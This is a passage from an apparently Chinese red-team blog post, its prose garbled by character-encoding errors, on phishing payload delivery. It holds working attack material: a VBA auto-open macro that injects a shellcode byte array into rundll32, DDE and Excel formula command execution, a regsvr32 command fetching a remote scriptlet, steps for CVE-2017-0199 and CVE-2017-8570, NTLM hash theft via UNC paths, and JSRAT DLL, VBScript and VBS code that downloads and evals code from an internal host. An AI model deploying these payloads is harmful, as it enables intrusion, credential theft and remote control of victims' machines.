class="number">47</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">57</span>,<span class="number">-57</span>,<span class="number">116</span>,<span class="number">-73</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">-23</span>,<span class="number">-111</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-23</span>,<span class="number">-55</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-24</span>,<span class="number">-117</span>,<span class="number">-1</span>, _</span><br><span class="line"><span class="number">-1</span>,<span class="number">-1</span>,<span class="number">47</span>,<span class="number">74</span>,<span class="number">112</span>,<span class="number">110</span>,<span class="number">52</span>,<span class="number">0</span>,<span class="number">71</span>,<span class="number">-37</span>,<span class="number">19</span>,<span class="number">-87</span>,<span class="number">58</span>,<span class="number">-110</span>,<span class="number">11</span>,<span class="number">66</span>,<span class="number">63</span>,<span class="number">40</span>,<span class="number">-36</span>,<span class="number">-114</span>,<span class="number">-75</span>,<span class="number">-101</span>,<span class="number">62</span>,<span class="number">108</span>,<span class="number">29</span>,<span class="number">-115</span>,<span class="number">-75</span>,<span class="number">-106</span>,<span class="number">35</span>,<span class="number">-3</span>,<span class="number">71</span>,<span class="number">126</span>,<span class="number">24</span>,<span class="number">-107</span>,<span class="number">101</span>,<span class="number">80</span>,<span class="number">116</span>,<span class="number">13</span>,<span class="number">70</span>,<span class="number">52</span>, _</span><br><span class="line"><span class="number">101</span>,<span class="number">6</span>,<span class="number">59</span>,<span class="number">-12</span>,<span class="number">-45</span>,<span class="number">32</span>,<span class="number">103</span>,<span class="number">-104</span>,<span class="number">10</span>,<span class="number">62</span>,<span class="number">77</span>,<span class="number">18</span>,<span class="number">-84</span>,<span class="number">12</span>,<span class="number">58</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">56</span>,<span class="number">-75</span>,<span class="number">32</span>,<span class="number">-39</span>,<span class="number">8</span>,<span class="number">-80</span>,<span class="number">107</span>,<span class="number">-43</span>,<span class="number">108</span>,<span class="number">71</span>,<span class="number">63</span>,<span class="number">20</span>,<span class="number">41</span>,<span class="number">-82</span>,<span class="number">-42</span>,<span class="number">23</span>,<span class="number">58</span>,<span class="number">-126</span>,<span class="number">98</span>,<span class="number">-100</span>,<span class="number">-108</span>,<span class="number">-126</span>,<span class="number">76</span>, _</span><br><span class="line"><span class="number">-44</span>,<span class="number">0</span>,<span class="number">85</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">45</span>,<span class="number">65</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">58</span>,<span class="number">32</span>,<span class="number">77</span>,<span class="number">111</span>,<span class="number">122</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">40</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">77</span>, _</span><br><span class="line"><span class="number">83</span>,<span class="number">73</span>,<span class="number">69</span>,<span class="number">32</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">87</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">32</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">84</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">66</span>,<span class="number">79</span>, _</span><br><span class="line"><span class="number">73</span>,<span class="number">69</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">69</span>,<span class="number">78</span>,<span class="number">85</span>,<span class="number">83</span>,<span class="number">77</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">41</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">53</span>,<span class="number">-24</span>,<span class="number">107</span>,<span class="number">-26</span>,<span class="number">-93</span>,<span class="number">106</span>,<span class="number">-40</span>,<span class="number">-71</span>,<span class="number">-105</span>,<span class="number">-127</span>,<span class="number">-22</span>,<span class="number">100</span>,<span class="number">-16</span>,<span class="number">117</span>,<span class="number">-9</span>,<span class="number">83</span>,<span class="number">112</span>,<span class="number">-101</span>,<span class="number">60</span>,<span class="number">-4</span>,<span class="number">105</span>,<span class="number">72</span>,<span class="number">-127</span>,<span class="number">96</span>,<span class="number">-60</span>, _</span><br><span class="line"><span class="number">-29</span>,<span class="number">27</span>,<span class="number">-62</span>,<span class="number">-29</span>,<span class="number">98</span>,<span class="number">-95</span>,<span class="number">-56</span>,<span class="number">-46</span>,<span class="number">-6</span>,<span class="number">-57</span>,<span class="number">-39</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">-70</span>,<span class="number">101</span>,<span class="number">-16</span>,<span class="number">86</span>,<span class="number">-85</span>,<span class="number">-15</span>,<span class="number">25</span>,<span class="number">102</span>,<span class="number">48</span>,<span class="number">-46</span>,<span class="number">-118</span>,<span class="number">-62</span>,<span class="number">1</span>,<span class="number">-19</span>,<span class="number">85</span>,<span class="number">56</span>,<span class="number">18</span>,<span class="number">-105</span>,<span class="number">41</span>,<span class="number">124</span>,<span class="number">102</span>,<span class="number">116</span>,<span class="number">-54</span>,<span class="number">50</span>,<span class="number">-67</span>,<span class="number">81</span>,<span class="number">-20</span>, _</span><br><span class="line"><span class="number">40</span>,<span class="number">-19</span>,<span class="number">-52</span>,<span class="number">101</span>,<span class="number">6</span>,<span class="number">116</span>,<span class="number">118</span>,<span class="number">-128</span>,<span class="number">-118</span>,<span class="number">-9</span>,<span class="number">-46</span>,<span class="number">-96</span>,<span class="number">-122</span>,<span class="number">116</span>,<span class="number">-70</span>,<span class="number">107</span>,<span class="number">-54</span>,<span class="number">-78</span>,<span class="number">59</span>,<span class="number">119</span>,<span class="number">-51</span>,<span class="number">-52</span>,<span class="number">5</span>,<span class="number">96</span>,<span class="number">53</span>,<span class="number">-9</span>,<span class="number">-60</span>,<span class="number">102</span>,<span class="number">-96</span>,<span class="number">109</span>,<span class="number">-90</span>,<span class="number">-122</span>,<span class="number">-92</span>,<span class="number">-81</span>,<span class="number">34</span>,<span class="number">-70</span>,<span class="number">-106</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">121</span>, _</span><br><span class="line"><span class="number">-6</span>,<span class="number">-5</span>,<span class="number">-12</span>,<span class="number">107</span>,<span class="number">-44</span>,<span class="number">73</span>,<span class="number">-31</span>,<span class="number">52</span>,<span class="number">87</span>,<span class="number">-89</span>,<span class="number">13</span>,<span class="number">77</span>,<span class="number">-121</span>,<span class="number">-68</span>,<span class="number">-37</span>,<span class="number">74</span>,<span class="number">-23</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">-122</span>,<span class="number">79</span>,<span class="number">66</span>,<span class="number">65</span>,<span class="number">-39</span>,<span class="number">58</span>,<span class="number">121</span>,<span class="number">-100</span>,<span class="number">20</span>,<span class="number">53</span>,<span class="number">28</span>,<span class="number">27</span>,<span class="number">-15</span>,<span class="number">29</span>,<span class="number">52</span>,<span class="number">-107</span>,<span class="number">127</span>,<span class="number">-89</span>,<span class="number">40</span>,<span class="number">-4</span>,<span class="number">-122</span>, _</span><br><span class="line"><span class="number">-73</span>,<span class="number">-101</span>,<span class="number">75</span>,<span class="number">-64</span>,<span class="number">-59</span>,<span class="number">111</span>,<span class="number">105</span>,<span class="number">16</span>,<span class="number">79</span>,<span class="number">-121</span>,<span class="number">7</span>,<span class="number">33</span>,<span class="number">-121</span>,<span class="number">58</span>,<span class="number">125</span>,<span class="number">79</span>,<span class="number">59</span>,<span class="number">31</span>,<span class="number">-97</span>,<span class="number">-45</span>,<span class="number">25</span>,<span class="number">105</span>,<span class="number">90</span>,<span class="number">-99</span>,<span class="number">6</span>,<span class="number">38</span>,<span class="number">74</span>,<span class="number">-22</span>,<span class="number">86</span>,<span class="number">17</span>,<span class="number">-99</span>,<span class="number">-58</span>,<span class="number">-36</span>,<span class="number">55</span>,<span class="number">5</span>,<span class="number">-96</span>,<span class="number">-109</span>,<span class="number">48</span>,<span class="number">42</span>,<span class="number">-66</span>, _</span><br><span class="line"><span class="number">-23</span>,<span class="number">-116</span>,<span class="number">-38</span>,<span class="number">-13</span>,<span class="number">-33</span>,<span class="number">89</span>,<span class="number">30</span>,<span class="number">32</span>,<span class="number">90</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">119</span>,<span class="number">118</span>,<span class="number">-33</span>,<span class="number">-48</span>,<span class="number">77</span>,<span class="number">24</span>,<span class="number">-76</span>,<span class="number">-11</span>,<span class="number">44</span>,<span class="number">50</span>,<span class="number">-68</span>,<span class="number">-127</span>,<span class="number">-70</span>,<span class="number">-43</span>,<span class="number">0</span>,<span class="number">104</span>,<span class="number">-16</span>,<span class="number">-75</span>,<span class="number">-94</span>,<span class="number">86</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">106</span>,<span class="number">64</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">0</span>, _</span><br><span class="line"><span class="number">104</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">0</span>,<span class="number">87</span>,<span class="number">104</span>,<span class="number">88</span>,<span class="number">-92</span>,<span class="number">83</span>,<span class="number">-27</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-109</span>,<span class="number">-71</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-39</span>,<span class="number">81</span>,<span class="number">83</span>,<span class="number">-119</span>,<span class="number">-25</span>,<span class="number">87</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">32</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">83</span>,<span class="number">86</span>,<span class="number">104</span>,<span class="number">18</span>,<span class="number">-106</span>,<span class="number">-119</span>,<span class="number">-30</span>,<span class="number">-1</span>,<span class="number">-43</span>, _</span><br><span class="line"><span class="number">-123</span>,<span class="number">-64</span>,<span class="number">116</span>,<span class="number">-58</span>,<span class="number">-117</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">-61</span>,<span class="number">-123</span>,<span class="number">-64</span>,<span class="number">117</span>,<span class="number">-27</span>,<span class="number">88</span>,<span class="number">-61</span>,<span class="number">-24</span>,<span class="number">-87</span>,<span class="number">-3</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">46</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">55</span>,<span class="number">0</span>,<span class="number">111</span>,<span class="number">-86</span>,<span class="number">81</span>,<span class="number">-61</span>)</span><br><span class="line">    <span class="keyword">If</span> Len(Environ(<span class="string">"ProgramW6432"</span>)) &gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">        sProc = Environ(<span class="string">"windir"</span>) &amp; <span class="string">"\\SysWOW64\\rundll32.exe"</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        sProc = Environ(<span class="string">"windir"</span>) &amp; <span class="string">"\\System32\\rundll32.exe"</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;, <span class="keyword">ByVal</span> <span class="number">1</span>&amp;, <span class="keyword">ByVal</span> <span class="number">4</span>&amp;, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, <span class="number">0</span>, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    <span class="keyword">For</span> offset = LBound(myArray) <span class="keyword">To</span> UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, <span class="number">1</span>, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;)</span><br><span class="line">    <span class="keyword">Next</span> offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, <span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
<p>ä»£ç åˆ†æï¼š sProcä¸ºrundll32.exeçš„è·¯å¾„<br>ç„¶åRunStff -&gt; CreateProcessA<br>ä½¿ç”¨rundll32åˆ›å»ºè¿›ç¨‹ï¼Œç„¶åä½¿ç”¨WriteStuffæ³¨å…¥shellcode(myArray)</p>
<p><strong>PS: åŒæ—¶ä¹Ÿå¯ç”¨Msf æˆ–è€… Empireç­‰å·¥å…·ç”ŸæˆMacroåé—¨</strong></p>
<h3 id="Office-DDE"><a href="#Office-DDE" class="headerlink" title="Office DDE"></a>Office DDE</h3><p>Ctrl + F9 ï¼ˆCommand + F9ï¼‰å¯å¼€å¯åŸŸ<br>å¡«å…¥ä»£ç å³å¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc.exe&quot; \* MERGEFORMAT</span><br></pre></td></tr></table></figure></p>
<p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/F8346748-1553-4C23-BD4E-063A4EA1150C.png" alt="15e498b5fb55042af504a1f99a898b91"></p>
<p>è”åŠ¨MSF (web_delivery)ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k regsvr32 /s /n /u /i:http://192.168.0.1/A9IcXi.sct scrobj.dll&quot;</span><br></pre></td></tr></table></figure></p>
<p>è¿™ç§æ–¹å¼å›éœ€è¦å—å®³è€…ç¡®è®¤æ‰“å¼€è¿›ç¨‹ï¼Œæœ‰ä¸€å®šé£é™©</p>
<h3 id="Excel-IQY"><a href="#Excel-IQY" class="headerlink" title="Excel IQY"></a>Excel IQY</h3><p>IQYæ˜¯ä¸€ä¸ªExcel WebæŸ¥è¯¢ç”¨åˆ°çš„ä¸œè¥¿ï¼Œå¯ä»¥ç›´æ¥å§äº’è”ç½‘ä¸Šçš„ä¸œè¥¿æ‰“å°åˆ°è¡¨ä¸­<br>æ•°æ®-&gt;å€’å…¥æ•°æ®-&gt;æ–°å»ºWebæŸ¥è¯¢<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/CBC34D2AE7ADB278D040CA16FF6E1DF9.jpg" alt="cbc34d2ae7adb278d040ca16ff6e1df9"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=cmd|&apos;/c calc.exe &apos;!A0</span><br></pre></td></tr></table></figure>
<p>å•å¼•å·å†…è°ƒç”¨æ¶æ„ç¨‹åº<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/6CA2FC83266D62BB018FA05C8DA71CE1.png" alt="6ca2fc83266d62bb018fa05c8da71ce1"></p>
<p>åŒæ ·éœ€è¦å—å®³è€…ç¡®è®¤æ‰“å¼€è¿›ç¨‹</p>
<h3 id="OLE"><a href="#OLE" class="headerlink" title="OLE"></a>OLE</h3><p>OLE - å¤–éƒ¨å¯¹è±¡<br>å¸¸è§åˆ©ç”¨åœºæ™¯è§CVE-2017-0199</p>
<h3 id="UNCè·¯å¾„"><a href="#UNCè·¯å¾„" class="headerlink" title="UNCè·¯å¾„"></a>UNCè·¯å¾„</h3><p>UNC(Universal Naming Convention)<br>å°±æ˜¯windowså…±äº«è¿›è¡Œ<br>ç»å…¸ç”¨æ³•:<br><a href="https://github.com/0x09AL/WordSteal" target="_blank" rel="noopener">https://github.com/0x09AL/WordSteal</a></p>
<p>æ’å…¥UNCè·¯å¾„çš„å›¾ç‰‡çªƒå–ç›®æ ‡ç”¨æˆ·NTMLhash</p>
<h3 id="Powerpoint-Button"><a href="#Powerpoint-Button" class="headerlink" title="Powerpoint Button"></a>Powerpoint Button</h3><p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/7E574267-CC0D-4847-B465-4ACB186D797B.png" alt="9524de25b9403cfff1df3282fc5b914c"></p>
<p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/8F4F1F9B-CFC0-4864-9613-3BC0D57E54EE.png" alt="5050e237bcc98ba0dfd904dfe9ffa4f7"></p>
<p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/7FE8F89E-CE1C-4D53-97AC-8859BC8F6951.png" alt="e63764e020d99c4a5aececdf8cd5c887"></p>
<h3 id="CVE-2017-0199"><a href="#CVE-2017-0199" class="headerlink" title="CVE-2017-0199"></a>CVE-2017-0199</h3><p>åˆ©ç”¨rtfçš„ç‰¹æ€§ï¼Œå¯ä»¥è‡ªå¯åŠ¨åŠ è½½OLEè°ƒç”¨çš„å¤–éƒ¨ç»„ä»¶ï¼Œé€šè¿‡ä¿®æ”¹Serverçš„MIMEç±»å‹ï¼Œè®©å¼•ç”¨çš„RTFæ–‡æ¡£è§£æä¸ºHTAæ–‡ä»¶ï¼Œæ‰§è¡Œå‘½ä»¤<br>å½±å“ç‰ˆæœ¬ï¼š<br><code>Office 2007,Office 2010,Office 2013,Office 2016</code></p>
<p>æ³¨æ„ç‚¹ï¼š<br>ä½¿ç”¨Notepad++å°†ç”Ÿæˆçš„rtfæ–‡æ¡£é‡Œçš„<br><code>\object\objautlink\rsltpict</code>æ›¿æ¢ä¸º<code>\object\objautlink\objupdate\rsltpict</code></p>
<p>è‡³äºä¿®æ”¹File Serverçš„MIMEç±»å‹:<br>ç›´æ¥åœ¨Apache2çš„ä¸»é…ç½®ä¸­ç¼–è¾‘ï¼š<br><code>AddType application/rtf .rtf</code></p>
<h3 id="CVE-2017-8570"><a href="#CVE-2017-8570" class="headerlink" title="CVE-2017-8570"></a>CVE-2017-8570</h3><p>åŸç†ï¼šåˆ©ç”¨RTFæ–‡æ¡£çš„Packager.dllæ­é…%temp%ç›®å½•ï¼Œå°†.sctä»¥Packagerå¯¹è±¡å­˜å…¥ï¼Œå†ç”¨rtfæ–‡æ¡£å»è°ƒç”¨ä»–ï¼Œå°±å¯ä»¥è¾¾åˆ°åˆ©ç”¨.sctè°ƒç”¨COMæ¥å£æ¥æ‰§è¡Œå‘½ä»¤çš„æ•ˆæœ</p>
<p><a href="https://github.com/klionsec/PhishingExploit/blob/master/CVE-2017-8570/packager_composite_moniker.py" target="_blank" rel="noopener">https://github.com/klionsec/PhishingExploit/blob/master/CVE-2017-8570/packager_composite_moniker.py</a></p>
<h2 id="0x01-Notepad-dllåé—¨"><a href="#0x01-Notepad-dllåé—¨" class="headerlink" title="0x01 Notepad++ dllåé—¨"></a>0x01 Notepad++ dllåé—¨</h2><p>å°±æ˜¯åˆ©ç”¨notepad++è‡ªå¸¦çš„import pluginåŠŸèƒ½ï¼Œè°ƒç”¨dllè¾¾åˆ°å‘½ä»¤æ‰§è¡Œ</p>
<p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/5B9031F9-6667-4535-B8DC-C1937D69D7E2.png" alt="400502f6e034cc52cd458c0c2451c407"></p>
<p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/567F801D-BF7D-415B-B71B-8C69B5FC2655.png" alt="3afea44ee05002f146cd03bebbf5141a"></p>
<p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/52DA7410-409A-48B8-A25F-D831E35E4895.png" alt="1877d5f999e0f057f910ad4e17d76273"></p>
<p>åº”ç”¨åœºæ™¯ï¼š ä¼ªé€ æ’ä»¶è¿›è¡Œé’“é±¼</p>
<h2 id="0x02-JSRAT"><a href="#0x02-JSRAT" class="headerlink" title="0x02 JSRAT"></a>0x02 JSRAT</h2><p><a href="http://www.anquan.us/static/drops/tips-11764.html" target="_blank" rel="noopener">Javascript Backdoor</a></p>
<p>æ ¸å¿ƒæ€è·¯æ˜¯åˆ©ç”¨<strong>rundll32.exe</strong>æ‰§è¡Œjavascriptä»£ç <br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(â€˜fooâ€™);</span><br></pre></td></tr></table></figure></p>
<p>æ‰€ä»¥ï¼Œä¸ºä»€ä¹ˆå¯ä»¥æ‰§è¡Œå‘¢ï¼Ÿ<br><a href="https://wooyun.js.org/drops/JavaScript%E5%90%8E%E9%97%A8%E6%B7%B1%E5%B1%82%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">JavaScriptåé—¨æ·±å±‚åˆ†æ</a></p>
<p><a href="http://www.anquan.us/static/drops/tips-12386.html" target="_blank" rel="noopener">JavaScript Phishing</a></p>
<h3 id="åˆ©ç”¨DLL-åŠ è½½-JS"><a href="#åˆ©ç”¨DLL-åŠ è½½-JS" class="headerlink" title="åˆ©ç”¨DLL åŠ è½½ JS"></a>åˆ©ç”¨DLL åŠ è½½ JS</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HANDLE hModule, </span></span></span><br><span class="line"><span class="function"><span class="params">                      DWORD  ul_reason_for_call, </span></span></span><br><span class="line"><span class="function"><span class="params">                      LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                      )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> *command=<span class="string">"cmd.exe /c start rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new\%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.1.100/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new\%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;"</span>;           </span><br><span class="line">            WinExec(command,SW_HIDE); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å›å¼¹åˆ°192.168.1.100çš„<a href="https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1" target="_blank" rel="noopener">JSRat.ps1</a></p>
<h3 id="åˆ©ç”¨-swf-åŠ è½½-JS"><a href="#åˆ©ç”¨-swf-åŠ è½½-JS" class="headerlink" title="åˆ©ç”¨ swf åŠ è½½ JS"></a>åˆ©ç”¨ swf åŠ è½½ JS</h3><p>åŒæ ·çš„ï¼Œåˆ©ç”¨msfè‡ªå¸¦ windows/execæ¨¡å—ç”Ÿæˆshellcode<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/DF559A52-42EB-46F2-8F0A-93762C6A891A.png" alt="23adc6883f957f15da50e03cd6dfd4a0"></p>
<p>åˆ©ç”¨Adobe Flash CS6ç¼–è¯‘ç”Ÿæˆswfï¼Œé…åˆAdobe Flash Playeræ¼æ´å³å¯RCE</p>
<h3 id="åˆ©ç”¨-æµè§ˆå™¨æ¼æ´-åŠ è½½-JS"><a href="#åˆ©ç”¨-æµè§ˆå™¨æ¼æ´-åŠ è½½-JS" class="headerlink" title="åˆ©ç”¨ æµè§ˆå™¨æ¼æ´ åŠ è½½ JS"></a>åˆ©ç”¨ æµè§ˆå™¨æ¼æ´ åŠ è½½ JS</h3><p>CVE-2014-6332 ç­‰æ¼æ´<br>åˆ©ç”¨é¡µé¢æ‰§è¡ŒVB Script<br><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT LANGUAGE=<span class="string">"VBScript"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> runmumaa() </span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">set</span> shell=createobject(<span class="string">"wscript.shell"</span>)</span><br><span class="line">shell.run <span class="string">"rundll32.exe javascript:"</span><span class="string">"\..\mshtml,RunHTMLApplication "</span><span class="string">";document.write();h=new%20ActiveXObject("</span><span class="string">"WinHttp.WinHttpRequest.5.1"</span><span class="string">");h.Open("</span><span class="string">"GET"</span><span class="string">","</span><span class="string">"http://192.168.174.136/connect"</span><span class="string">",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject("</span><span class="string">"WScript.Shell"</span><span class="string">").Run("</span><span class="string">"cmd /c taskkill /f /im rundll32.exe"</span><span class="string">",0,true);&#125;"</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">function</span></span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="åˆ©ç”¨-VBS-åŠ è½½-JS"><a href="#åˆ©ç”¨-VBS-åŠ è½½-JS" class="headerlink" title="åˆ©ç”¨ VBS åŠ è½½ JS"></a>åˆ©ç”¨ VBS åŠ è½½ JS</h3><p>åˆ©ç”¨VBSè°ƒç”¨Wscript.shellï¼Œè¿è¡Œå‘½ä»¤<br><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> shell=<span class="built_in">createobject</span>(<span class="string">"wscript.shell"</span>)</span><br><span class="line">shell.run <span class="string">"rundll32.exe javascript:"</span><span class="string">"\..\mshtml,RunHTMLApplication "</span><span class="string">";document.write();h=new%20ActiveXObject("</span><span class="string">"WinHttp.WinHttpRequest.5.1"</span><span class="string">");h.Open("</span><span class="string">"GET"</span><span class="string">","</span><span class="string">"http://192.168.174.136/connect"</span><span class="string">",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject("</span><span class="string">"WScript.Shell"</span><span class="string">").Run("</span><span class="string">"cmd /c taskkill /f /im rundll32.exe"</span><span class="string">",0,true);&#125;"</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure></p>
<h3 id="åˆ©ç”¨-CHM-åŠ è½½-JS"><a href="#åˆ©ç”¨-CHM-åŠ è½½-JS" class="headerlink" title="åˆ©ç”¨ CHM åŠ è½½ JS"></a>åˆ©ç”¨ CHM åŠ è½½ JS</h3><p>åˆ©ç”¨CHMçš„åé—¨ï¼ŒåŠ è½½JS<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> 